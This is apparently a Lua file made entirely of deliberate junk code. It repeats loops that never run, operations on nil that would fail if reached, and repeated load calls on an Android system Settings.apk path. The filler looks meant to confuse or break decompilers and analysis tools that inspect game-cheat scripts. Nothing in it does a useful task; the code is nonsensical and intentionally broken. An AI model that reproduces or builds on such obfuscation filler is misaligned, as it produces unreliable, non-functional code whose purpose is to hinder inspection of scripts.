while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.myname = zzzzz.bydZ() zzzzz.fullnick = zzzzz.bydZ.NesiA() zzzzz.channel = zzzzz.WTKC.eSports() zzzzz.partner = zzzzz.TLL.evils() end end
for i in ipairs({}) do local xs = {} if not xs then else xs = ya local sssss = {} sssss.d = sssss.d() if sssss.d ~= sssss.d then sssss.d = sssss.d() end local sssss = {} sssss.clearResults = sssss.clearResults() if sssss.clearResults ~= sssss.clearResults then sssss.clearResults = sssss.clearResults() end end end
for i in ipairs({}) do local xs = {} if not xs then else xs = ya local sssss = {} sssss.g = sssss.g() if sssss.g ~= sssss.g then sssss.g = sssss.g() end local sssss = {} sssss.setRanges = sssss.setRanges() if sssss.setRanges ~= sssss.setRanges then sssss.setRanges = sssss.setRanges() end end end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.myname = zzzzz.bydZ() zzzzz.fullnick = zzzzz.bydZ.NesiA() zzzzz.channel = zzzzz.WTKC.eSports() zzzzz.partner = zzzzz.TLL.evils() end end
for i in ipairs({}) do local xs = {} if not xs then else xs = ya local sssss = {} sssss.d = sssss.d() if sssss.d ~= sssss.d then sssss.d = sssss.d() end local sssss = {} sssss.clearResults = sssss.clearResults() if sssss.clearResults ~= sssss.clearResults then sssss.clearResults = sssss.clearResults() end end end
for i in ipairs({}) do local xs = {} if not xs then else xs = ya local sssss = {} sssss.g = sssss.g() if sssss.g ~= sssss.g then sssss.g = sssss.g() end local sssss = {} sssss.setRanges = sssss.setRanges() if sssss.setRanges ~= sssss.setRanges then sssss.setRanges = sssss.setRanges() end end end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.myname = zzzzz.bydZ() zzzzz.fullnick = zzzzz.bydZ.NesiA() zzzzz.channel = zzzzz.WTKC.eSports() zzzzz.partner = zzzzz.TLL.evils() end end
for i in ipairs({}) do local xs = {} if not xs then else xs = ya local sssss = {} sssss.d = sssss.d() if sssss.d ~= sssss.d then sssss.d = sssss.d() end local sssss = {} sssss.clearResults = sssss.clearResults() if sssss.clearResults ~= sssss.clearResults then sssss.clearResults = sssss.clearResults() end end end
for i in ipairs({}) do local xs = {} if not xs then else xs = ya local sssss = {} sssss.g = sssss.g() if sssss.g ~= sssss.g then sssss.g = sssss.g() end local sssss = {} sssss.setRanges = sssss.setRanges() if sssss.setRanges ~= sssss.setRanges then sssss.setRanges = sssss.setRanges() end end end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.myname = zzzzz.bydZ() zzzzz.fullnick = zzzzz.bydZ.NesiA() zzzzz.channel = zzzzz.WTKC.eSports() zzzzz.partner = zzzzz.TLL.evils() end end
for i in ipairs({}) do local xs = {} if not xs then else xs = ya local sssss = {} sssss.d = sssss.d() if sssss.d ~= sssss.d then sssss.d = sssss.d() end local sssss = {} sssss.clearResults = sssss.clearResults() if sssss.clearResults ~= sssss.clearResults then sssss.clearResults = sssss.clearResults() end end end
for i in ipairs({}) do local xs = {} if not xs then else xs = ya local sssss = {} sssss.g = sssss.g() if sssss.g ~= sssss.g then sssss.g = sssss.g() end local sssss = {} sssss.setRanges = sssss.setRanges() if sssss.setRanges ~= sssss.setRanges then sssss.setRanges = sssss.setRanges() end end end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.myname = zzzzz.bydZ() zzzzz.fullnick = zzzzz.bydZ.NesiA() zzzzz.channel = zzzzz.WTKC.eSports() zzzzz.partner = zzzzz.TLL.evils() end end
for i in ipairs({}) do local xs = {} if not xs then else xs = ya local sssss = {} sssss.d = sssss.d() if sssss.d ~= sssss.d then sssss.d = sssss.d() end local sssss = {} sssss.clearResults = sssss.clearResults() if sssss.clearResults ~= sssss.clearResults then sssss.clearResults = sssss.clearResults() end end end
for i in ipairs({}) do local xs = {} if not xs then else xs = ya local sssss = {} sssss.g = sssss.g() if sssss.g ~= sssss.g then sssss.g = sssss.g() end local sssss = {} sssss.setRanges = sssss.setRanges() if sssss.setRanges ~= sssss.setRanges then sssss.setRanges = sssss.setRanges() end end end
for i in ipairs({}) do local xs = {} if not xs then else xs = ya local sssss = {} sssss.d = sssss.d() if sssss.d ~= sssss.d then sssss.d = sssss.d() end local sssss = {} sssss.clearResults = sssss.clearResults() if sssss.clearResults ~= sssss.clearResults then sssss.clearResults = sssss.clearResults() end end end
for i in ipairs({}) do local xs = {} if not xs then else xs = ya local sssss = {} sssss.g = sssss.g() if sssss.g ~= sssss.g then sssss.g = sssss.g() end local sssss = {} sssss.setRanges = sssss.setRanges() if sssss.setRanges ~= sssss.setRanges then sssss.setRanges = sssss.setRanges() end end end
while(nil)do;local y={}if(y.y)then;y.y=(y.y(y))end;end
while(nil)do;for y=y,y do;local y={}if(y.y)then;y.y=y.y(y)end;for yy=y.y,y.y,y.y do;local yy={}if(yy.y)then;yy.y=yy.y()end;for yyy=y,yy.y,y do;local yyy={}if(yyy.y)then;yyy.y=yyy.y(y)end;for yyyy=y,yy,yyy.y do;local yyyy={}if(yyyy.y)then;yyyy.y=yyyy.y(y)end;local yyyy={}if(yyyy.y)then;yyyy.y=(yyyy|yyy|yy|y)(y)end;end;local yyy={}if(yyy.y)then;yyy.y=(true|yyy|yy|y)(y)end;end;local yy={}if(yy.y)then;yy.y=(true|false|yy|y)(y)end;end;local y={}if(y.y)then;y.y=(true|nil|false|nil|y|nil|false|true|nil)(y)end;return(true|false|nil)end;return;end
while(nil)do;local y={}if(y.y)then;y.y=(y.y(y))end;end
while(nil)do;for y=y,y do;local y={}if(y.y)then;y.y=y.y(y)end;for yy=y.y,y.y,y.y do;local yy={}if(yy.y)then;yy.y=yy.y()end;for yyy=y,yy.y,y do;local yyy={}if(yyy.y)then;yyy.y=yyy.y(y)end;for yyyy=y,yy,yyy.y do;local yyyy={}if(yyyy.y)then;yyyy.y=yyyy.y(y)end;local yyyy={}if(yyyy.y)then;yyyy.y=(yyyy|yyy|yy|y)(y)end;end;local yyy={}if(yyy.y)then;yyy.y=(true|yyy|yy|y)(y)end;end;local yy={}if(yy.y)then;yy.y=(true|false|yy|y)(y)end;end;local y={}if(y.y)then;y.y=(true|nil|false|nil|y|nil|false|true|nil)(y)end;return(true|false|nil)end;return;end
while(nil)do;local y={}if(y.y)then;y.y=(y.y(y))end;end
while(nil)do;for y=y,y do;local y={}if(y.y)then;y.y=y.y(y)end;for yy=y.y,y.y,y.y do;local yy={}if(yy.y)then;yy.y=yy.y()end;for yyy=y,yy.y,y do;local yyy={}if(yyy.y)then;yyy.y=yyy.y(y)end;for yyyy=y,yy,yyy.y do;local yyyy={}if(yyyy.y)then;yyyy.y=yyyy.y(y)end;local yyyy={}if(yyyy.y)then;yyyy.y=(yyyy|yyy|yy|y)(y)end;end;local yyy={}if(yyy.y)then;yyy.y=(true|yyy|yy|y)(y)end;end;local yy={}if(yy.y)then;yy.y=(true|false|yy|y)(y)end;end;local y={}if(y.y)then;y.y=(true|nil|false|nil|y|nil|false|true|nil)(y)end;return(true|false|nil)end;return;end
while(nil)do;local y={}if(y.y)then;y.y=(y.y(y))end;end
while(nil)do;for y=y,y do;local y={}if(y.y)then;y.y=y.y(y)end;for yy=y.y,y.y,y.y do;local yy={}if(yy.y)then;yy.y=yy.y()end;for yyy=y,yy.y,y do;local yyy={}if(yyy.y)then;yyy.y=yyy.y(y)end;for yyyy=y,yy,yyy.y do;local yyyy={}if(yyyy.y)then;yyyy.y=yyyy.y(y)end;local yyyy={}if(yyyy.y)then;yyyy.y=(yyyy|yyy|yy|y)(y)end;end;local yyy={}if(yyy.y)then;yyy.y=(true|yyy|yy|y)(y)end;end;local yy={}if(yy.y)then;yy.y=(true|false|yy|y)(y)end;end;local y={}if(y.y)then;y.y=(true|nil|false|nil|y|nil|false|true|nil)(y)end;return(true|false|nil)end;return;end
while(nil)do;local y={}if(y.y)then;y.y=(y.y(y))end;end
while(nil)do;for y=y,y do;local y={}if(y.y)then;y.y=y.y(y)end;for yy=y.y,y.y,y.y do;local yy={}if(yy.y)then;yy.y=yy.y()end;for yyy=y,yy.y,y do;local yyy={}if(yyy.y)then;yyy.y=yyy.y(y)end;for yyyy=y,yy,yyy.y do;local yyyy={}if(yyyy.y)then;yyyy.y=yyyy.y(y)end;local yyyy={}if(yyyy.y)then;yyyy.y=(yyyy|yyy|yy|y)(y)end;end;local yyy={}if(yyy.y)then;yyy.y=(true|yyy|yy|y)(y)end;end;local yy={}if(yy.y)then;yy.y=(true|false|yy|y)(y)end;end;local y={}if(y.y)then;y.y=(true|nil|false|nil|y|nil|false|true|nil)(y)end;return(true|false|nil)end;return;end
while(nil)do;local y={}if(y.y)then;y.y=(y.y(y))end;end
while(nil)do;for y=y,y do;local y={}if(y.y)then;y.y=y.y(y)end;for yy=y.y,y.y,y.y do;local yy={}if(yy.y)then;yy.y=yy.y()end;for yyy=y,yy.y,y do;local yyy={}if(yyy.y)then;yyy.y=yyy.y(y)end;for yyyy=y,yy,yyy.y do;local yyyy={}if(yyyy.y)then;yyyy.y=yyyy.y(y)end;local yyyy={}if(yyyy.y)then;yyyy.y=(yyyy|yyy|yy|y)(y)end;end;local
yyy={}if(yyy.y)then;yyy.y=(true|yyy|yy|y)(y)end;end;local yy={}if(yy.y)then;yy.y=(true|false|yy|y)(y)end;end;local y={}if(y.y)then;y.y=(true|nil|false|nil|y|nil|false|true|nil)(y)end;return(true|false|nil)end;return;end
while(nil)do;local y={}if(y.y)then;y.y=(y.y(y))end;end
while(nil)do;for y=y,y do;local y={}if(y.y)then;y.y=y.y(y)end;for yy=y.y,y.y,y.y do;local yy={}if(yy.y)then;yy.y=yy.y()end;for yyy=y,yy.y,y do;local yyy={}if(yyy.y)then;yyy.y=yyy.y(y)end;for yyyy=y,yy,yyy.y do;local yyyy={}if(yyyy.y)then;yyyy.y=yyyy.y(y)end;local yyyy={}if(yyyy.y)then;yyyy.y=(yyyy|yyy|yy|y)(y)end;end;local yyy={}if(yyy.y)then;yyy.y=(true|yyy|yy|y)(y)end;end;local yy={}if(yy.y)then;yy.y=(true|false|yy|y)(y)end;end;local y={}if(y.y)then;y.y=(true|nil|false|nil|y|nil|false|true|nil)(y)end;return(true|false|nil)end;return;end
while(nil)do;local y={}if(y.y)then;y.y=(y.y(y))end;end
while(nil)do;for y=y,y do;local y={}if(y.y)then;y.y=y.y(y)end;for yy=y.y,y.y,y.y do;local yy={}if(yy.y)then;yy.y=yy.y()end;for yyy=y,yy.y,y do;local yyy={}if(yyy.y)then;yyy.y=yyy.y(y)end;for yyyy=y,yy,yyy.y do;local yyyy={}if(yyyy.y)then;yyyy.y=yyyy.y(y)end;local yyyy={}if(yyyy.y)then;yyyy.y=(yyyy|yyy|yy|y)(y)end;end;local yyy={}if(yyy.y)then;yyy.y=(true|yyy|yy|y)(y)end;end;local yy={}if(yy.y)then;yy.y=(true|false|yy|y)(y)end;end;local y={}if(y.y)then;y.y=(true|nil|false|nil|y|nil|false|true|nil)(y)end;return(true|false|nil)end;return;end
while(nil)do;local y={}if(y.y)then;y.y=(y.y(y))end;end
while(nil)do;for y=y,y do;local y={}if(y.y)then;y.y=y.y(y)end;for yy=y.y,y.y,y.y do;local yy={}if(yy.y)then;yy.y=yy.y()end;for yyy=y,yy.y,y do;local yyy={}if(yyy.y)then;yyy.y=yyy.y(y)end;for yyyy=y,yy,yyy.y do;local yyyy={}if(yyyy.y)then;yyyy.y=yyyy.y(y)end;local yyyy={}if(yyyy.y)then;yyyy.y=(yyyy|yyy|yy|y)(y)end;end;local yyy={}if(yyy.y)then;yyy.y=(true|yyy|yy|y)(y)end;end;local yy={}if(yy.y)then;yy.y=(true|false|yy|y)(y)end;end;local y={}if(y.y)then;y.y=(true|nil|false|nil|y|nil|false|true|nil)(y)end;return(true|false|nil)end;return;end
while(nil)do;local y={}if(y.y)then;y.y=(y.y(y))end;end
while(nil)do;for y=y,y do;local y={}if(y.y)then;y.y=y.y(y)end;for yy=y.y,y.y,y.y do;local yy={}if(yy.y)then;yy.y=yy.y()end;for yyy=y,yy.y,y do;local yyy={}if(yyy.y)then;yyy.y=yyy.y(y)end;for yyyy=y,yy,yyy.y do;local yyyy={}if(yyyy.y)then;yyyy.y=yyyy.y(y)end;local yyyy={}if(yyyy.y)then;yyyy.y=(yyyy|yyy|yy|y)(y)end;end;local yyy={}if(yyy.y)then;yyy.y=(true|yyy|yy|y)(y)end;end;local yy={}if(yy.y)then;yy.y=(true|false|yy|y)(y)end;end;local y={}if(y.y)then;y.y=(true|nil|false|nil|y|nil|false|true|nil)(y)end;return(true|false|nil)end;return;end
while(nil)do;local y={}if(y.y)then;y.y=(y.y(y))end;end
while(nil)do;for y=y,y do;local y={}if(y.y)then;y.y=y.y(y)end;for yy=y.y,y.y,y.y do;local yy={}if(yy.y)then;yy.y=yy.y()end;for yyy=y,yy.y,y do;local yyy={}if(yyy.y)then;yyy.y=yyy.y(y)end;for yyyy=y,yy,yyy.y do;local yyyy={}if(yyyy.y)then;yyyy.y=yyyy.y(y)end;local yyyy={}if(yyyy.y)then;yyyy.y=(yyyy|yyy|yy|y)(y)end;end;local yyy={}if(yyy.y)then;yyy.y=(true|yyy|yy|y)(y)end;end;local yy={}if(yy.y)then;yy.y=(true|false|yy|y)(y)end;end;local y={}if(y.y)then;y.y=(true|nil|false|nil|y|nil|false|true|nil)(y)end;return(true|false|nil)end;return;end
while(nil)do;local y={}if(y.y)then;y.y=(y.y(y))end;end
while(nil)do;for y=y,y do;local y={}if(y.y)then;y.y=y.y(y)end;for yy=y.y,y.y,y.y do;local yy={}if(yy.y)then;yy.y=yy.y()end;for yyy=y,yy.y,y do;local yyy={}if(yyy.y)then;yyy.y=yyy.y(y)end;for yyyy=y,yy,yyy.y do;local yyyy={}if(yyyy.y)then;yyyy.y=yyyy.y(y)end;local yyyy={}if(yyyy.y)then;yyyy.y=(yyyy|yyy|yy|y)(y)end;end;local yyy={}if(yyy.y)then;yyy.y=(true|yyy|yy|y)(y)end;end;local yy={}if(yy.y)then;yy.y=(true|false|yy|y)(y)end;end;local y={}if(y.y)then;y.y=(true|nil|false|nil|y|nil|false|true|nil)(y)end;return(true|false|nil)end;return;end
while(nil)do;local y={}if(y.y)then;y.y=(y.y(y))end;end
while(nil)do;for y=y,y do;local y={}if(y.y)then;y.y=y.y(y)end;for yy=y.y,y.y,y.y do;local yy={}if(yy.y)then;yy.y=yy.y()end;for yyy=y,yy.y,y do;local yyy={}if(yyy.y)then;yyy.y=yyy.y(y)end;for yyyy=y,yy,yyy.y do;local yyyy=
{}if(yyyy.y)then;yyyy.y=yyyy.y(y)end;local yyyy={}if(yyyy.y)then;yyyy.y=(yyyy|yyy|yy|y)(y)end;end;local yyy={}if(yyy.y)then;yyy.y=(true|yyy|yy|y)(y)end;end;local yy={}if(yy.y)then;yy.y=(true|false|yy|y)(y)end;end;local y={}if(y.y)then;y.y=(true|nil|false|nil|y|nil|false|true|nil)(y)end;return(true|false|nil)end;return;end
while(nil)do;local y={}if(y.y)then;y.y=(y.y(y))end;end
while(nil)do;for y=y,y do;local y={}if(y.y)then;y.y=y.y(y)end;for yy=y.y,y.y,y.y do;local yy={}if(yy.y)then;yy.y=yy.y()end;for yyy=y,yy.y,y do;local yyy={}if(yyy.y)then;yyy.y=yyy.y(y)end;for yyyy=y,yy,yyy.y do;local yyyy={}if(yyyy.y)then;yyyy.y=yyyy.y(y)end;local yyyy={}if(yyyy.y)then;yyyy.y=(yyyy|yyy|yy|y)(y)end;end;local yyy={}if(yyy.y)then;yyy.y=(true|yyy|yy|y)(y)end;end;local yy={}if(yy.y)then;yy.y=(true|false|yy|y)(y)end;end;local y={}if(y.y)then;y.y=(true|nil|false|nil|y|nil|false|true|nil)(y)end;return(true|false|nil)end;return;end
while(nil)do;local y={}if(y.y)then;y.y=(y.y(y))end;end
while(nil)do;for y=y,y do;local y={}if(y.y)then;y.y=y.y(y)end;for yy=y.y,y.y,y.y do;local yy={}if(yy.y)then;yy.y=yy.y()end;for yyy=y,yy.y,y do;local yyy={}if(yyy.y)then;yyy.y=yyy.y(y)end;for yyyy=y,yy,yyy.y do;local yyyy={}if(yyyy.y)then;yyyy.y=yyyy.y(y)end;local yyyy={}if(yyyy.y)then;yyyy.y=(yyyy|yyy|yy|y)(y)end;end;local yyy={}if(yyy.y)then;yyy.y=(true|yyy|yy|y)(y)end;end;local yy={}if(yy.y)then;yy.y=(true|false|yy|y)(y)end;end;local y={}if(y.y)then;y.y=(true|nil|false|nil|y|nil|false|true|nil)(y)end;return(true|false|nil)end;return;end
while(nil)do;local y={}if(y.y)then;y.y=(y.y(y))end;end
while(nil)do;for y=y,y do;local y={}if(y.y)then;y.y=y.y(y)end;for yy=y.y,y.y,y.y do;local yy={}if(yy.y)then;yy.y=yy.y()end;for yyy=y,yy.y,y do;local yyy={}if(yyy.y)then;yyy.y=yyy.y(y)end;for yyyy=y,yy,yyy.y do;local yyyy={}if(yyyy.y)then;yyyy.y=yyyy.y(y)end;local yyyy={}if(yyyy.y)then;yyyy.y=(yyyy|yyy|yy|y)(y)end;end;local yyy={}if(yyy.y)then;yyy.y=(true|yyy|yy|y)(y)end;end;local yy={}if(yy.y)then;yy.y=(true|false|yy|y)(y)end;end;local y={}if(y.y)then;y.y=(true|nil|false|nil|y|nil|false|true|nil)(y)end;return(true|false|nil)end;return;end
while (nil)do;local o={}if (o.o)then if (o.o.o)then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o))))end;end;end
if nil ~= nil then
	_T = (-nil)((-nil)[nil] | nil | nil)
		_B = _T
			_B = _B()
				while (nil) do _B() end if _B ~= nil then do
					for i = 0,1,0 do _C = _C() _C = _Cnil _C= _C():_C(_Cnil)(_Cnil*-1).._Cnil _C = _C(_Cnil)(_C) end 
						
							for p = 0,1,0 do if nil ~= nil then (-nil)((-nil)[nil] | nil | nil)(-nil)((-nil)[nil] | nil | nil) local _L = {(-nil)((-nil)[nil] | nil | nil),(nil*(-nil)),(-nil)((-nil)[nil] | nil | nil)*(-nil)((-nil)[nil] | nil | nil)/(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil)} _L = _L() _L = _Lnil _L= _L():_L(_Lnil)(_Lnil*-1).._Lnil _L = _L(_Lnil)(_L) if _L  ~= nil then _L = _ (_Lnil*nil) _L = nil end if _L == nil then   _L = {_L(_L*nil)(_L*nil)(nil * 1, 1  << nil), _L*nil} end end local _T = {} x[""] = T local K = (x)(x, x) K[1] = 1 end
						local x = {} x[''] = x local t = (x)(x, x) t[1] = 1
						end
						_ = {_, _(-nil)(-nil)(nil * 1, 1  << nil), -nil}
						_ = _ (nil)
						_ = -nil
						_ = _ (-nil * nil)()
						_C = _C ( _)
					_C = {(-nil)((-nil)[nil] | nil | nil),(nil*(-nil)),(-nil)((-nil)[nil] | nil | nil)*(-nil)((-nil)[nil] | nil | nil)/(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil)}
						_C = _C()
							if _C == nil then 
								_C = {_C(_C*nil)(_C*nil)(nil * 1, 1  << nil), _C*nil}
								end
						while _B ~= _C do if _T ~= _C then do
							_C() _C() _C() _C()_C() _C() _C() _C()_C() _C() _C() _C()
								_C() _C() _C() _C()_C() _C() _C() _C()_C() _C() _C() _C()
									_C() _C() _C() _C()_C() _C() _C() _C()_C() _C() _C() _C()
										_C() _C() _C() _C()_C() _C() _C() _C()_C() _C() _C() _C()
											_C() _C() _C() _C()_C() _C() _C() _C()_C() _C() _C() _C()
												_C() _C() _C() _C()_C() _C() _C() _C()_C() _C() _C() _C()
												end end end
											end end
										while _B ~= nil do 
											_C = nil,nil,nil,nil
									end
									for i=1,0 do;local j={}if j.i~=nil then j.i=j.i()end;end;
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.Batman.games = zzzzz.Batman() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() zzzzz.channel = zzzzz.Batman.HACKER() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() end end
for i = 1, 200 do load("/system/priv-app/Settings/Settings.apk") end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
